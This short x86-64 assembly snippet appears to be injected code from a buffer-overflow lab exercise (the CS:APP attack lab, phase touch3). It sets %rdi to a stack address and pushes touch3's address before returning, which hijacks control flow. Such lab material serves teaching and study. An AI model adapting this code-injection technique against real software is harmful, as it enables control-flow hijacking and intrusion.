# modify %rdi and get into touch3()
pushq $0x00000000004018fa # touch3
movq $0x000000005561dca8, %rdi
ret
